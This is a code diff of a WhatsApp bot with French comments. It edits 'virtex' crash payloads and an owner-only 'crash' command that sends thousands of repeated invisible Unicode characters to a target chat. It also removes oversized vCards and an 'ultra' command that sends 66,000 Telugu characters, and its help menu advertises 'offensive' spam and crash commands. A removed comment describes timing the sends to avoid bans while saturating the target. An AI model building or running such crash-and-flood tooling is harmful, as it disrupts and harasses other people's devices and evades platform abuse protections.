@@ -26,19 +26,10 @@ if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });
 
 // --- COLLECTIONS DE TEXTES SPÉCIAUX (VIRTEX) ---
 const VIRTEX_PAYLOADS = [
-    "\u200e\u200f".repeat(15000), // Caractères de direction RTL/LTR (Surcharge de rendu)
-    "\u00ad".repeat(15000), // Soft Hyphen
-    "\u200b".repeat(25000), // Zero-width space (Saturation de mémoire)
-    "\u061c".repeat(15000), // Arabic Letter Mark
-    "జ్ఞా".repeat(5000), // Telugu character (Crash de rendu sur certains OS)
-    "0".repeat(100000), // Surcharge de buffer simple
-    "🔴".repeat(10000) + "⚫".repeat(10000), // Crash visuel
-    "🏳️‍🌈".repeat(5000) + "🏴‍☠️".repeat(5000) // Surcharge d'emojis complexes
-];
-
-const ADVANCED_VCARDS = [
-    'BEGIN:VCARD\nVERSION:3.0\nFN:' + "☣️".repeat(5000) + '\nORG:' + "🔥".repeat(5000) + ';\nEND:VCARD',
-    'BEGIN:VCARD\nVERSION:3.0\nFN:System Error\nTEL;type=CELL;type=VOICE;type=pref:+' + "1".repeat(1000) + '\nEND:VCARD'
+    "\u200e\u200f".repeat(10000), // Caractères de direction RTL/LTR
+    "\u00ad".repeat(10000), // Soft Hyphen
+    "\u200b".repeat(20000), // Zero-width space
+    "\u061c".repeat(10000) // Arabic Letter Mark
 ];
 
 // --- VARIABLES GLOBALES ---
@@ -381,55 +372,18 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                 return;
             }
 
-            // Crash Test (Virtex) - Version Améliorée
+            // Crash Test (Virtex)
             if (lowerText.startsWith("crash")) {
-                const args = lowerText.split(" ");
-                const count = parseInt(args[1]) || 5;
-                const type = args[2] || "mix"; // Types: text, vcard, mix
-
-                await sock.sendMessage(remoteJid, { text: `☣️ *CRASH TEST PRO ACTIVÉ*\nCible: ${remoteJid}\nCharges: ${count}\nType: ${type.toUpperCase()}` });
-                
+                const count = parseInt(lowerText.split(" ")[1]) || 5;
+                await sock.sendMessage(remoteJid, { text: `☣️ *CRASH TEST*\nEnvoi de ${count} charges lourdes...` });
                 for (let i = 0; i < count; i++) {
-                    if (!current.isBotActive) break;
-
-                    try {
-                        if (type === "text" || (type === "mix" && i % 2 === 0)) {
-                            const payload = VIRTEX_PAYLOADS[Math.floor(Math.random() * VIRTEX_PAYLOADS.length)];
-                            await sock.sendMessage(remoteJid, { text: payload + getInvisibleJunk() });
-                        } else {
-                            const vcard = ADVANCED_VCARDS[Math.floor(Math.random() * ADVANCED_VCARDS.length)];
-                            await sock.sendMessage(remoteJid, { 
-                                contacts: { 
-                                    displayName: '⚠️ System Failure', 
-                                    contacts: [{ vcard }] 
-                                } 
-                            });
-                        }
-                    } catch (e) {
-                        console.error("Erreur lors de l'envoi du crash:", e);
-                    }
-                    
-                    // Délai variable pour éviter le ban tout en saturant la cible
-                    await sleep(150 + Math.random() * 100);
-                }
-                await sock.sendMessage(remoteJid, { text: "✅ *SÉQUENCE DE CRASH TERMINÉE*" });
-                return;
-            }
-            // Commande Ultra-Crash (65000+ caractères)
-            if (lowerText.startsWith("ultra")) {
-                const char = "జ్ఞా";
-                const payload = char.repeat(66000);
-                await sock.sendMessage(remoteJid, { text: "☣️ *CHARGEMENT DE L'ULTRA-CRASH...*" });
-                try {
+                    const payload = VIRTEX_PAYLOADS[Math.floor(Math.random() * VIRTEX_PAYLOADS.length)];
                     await sock.sendMessage(remoteJid, { text: payload });
-                    await sock.sendMessage(remoteJid, { text: "✅ *ULTRA-CRASH ENVOYÉ*" });
-                } catch (e) {
-                    console.error("Erreur Ultra-Crash:", e);
-                    await sock.sendMessage(remoteJid, { text: "❌ Échec de l'envoi massif." });
+                    await sleep(200);
                 }
+                await sock.sendMessage(remoteJid, { text: "✅ Opération terminée." });
                 return;
             }
-
         }
 
         // --- COMMANDES PUBLIQUES / MIXTES ---
@@ -453,7 +407,6 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                 `*--- OFFENSIF (Proprio) ---*\n` +
                 `- *love [texte] [qté] [ms]* : Spam optimisé\n` +
                 `- *crash [nombre]* : Envoi de Virtex\n` +
-                `- *ultra* : Envoi massif de caractères (65k+)\n` +
                 `- *stop* : Arrêter le spam en cours\n\n` +
                 `*Statut :* ${current.isBotActive ? "ACTIF ✅" : "INACTIF 🛑"}`;
             
